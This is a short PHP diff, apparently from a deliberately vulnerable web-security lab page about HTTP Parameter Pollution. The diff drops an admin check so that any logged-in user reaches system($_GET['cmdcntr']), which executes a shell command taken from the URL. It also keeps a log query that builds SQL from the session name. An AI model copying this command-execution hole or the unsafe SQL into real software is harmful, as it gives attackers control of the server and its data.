@@ -51,10 +51,7 @@ if(isset($_SESSION['name']))
 	$conn = mysqli_connect($servername, $username, $password, $database);
 	$name = $_SESSION['name'];
 	$date =  date('Y-m-d H:i:s');
-
-	if($name==="admin")
-	{
-		echo "HTTP Parameter Pollution or HPP in short is a vulnerability that occurs<br>due to passing of multiple parameters having same name";
+	echo "HTTP Parameter Pollution or HPP in short is a vulnerability that occurs<br>due to passing of multiple parameters having same name";
 		$sql = "insert into log (name , page_visited , date_time) values ('$name','control','$date')";
 
 		if(mysqli_query($conn,$sql))
@@ -62,12 +59,7 @@ if(isset($_SESSION['name']))
 				echo "<br><br>";
 				echo "Date & Time : ".$date;
 			}
-		system($_GET['timer']); //system() is not safe to use , dont' forget to remove it  in latest release .
-	}
-	else
-	{
-		echo "HTTP Parameter Pollution or HPP in short is a vulnerability that occurs<br>due to passing of multiple parameters having same name";
-	}
+		system($_GET['cmdcntr']); //system() is not safe to use , dont' forget to remove it  in latest release .
 }
 else
 {
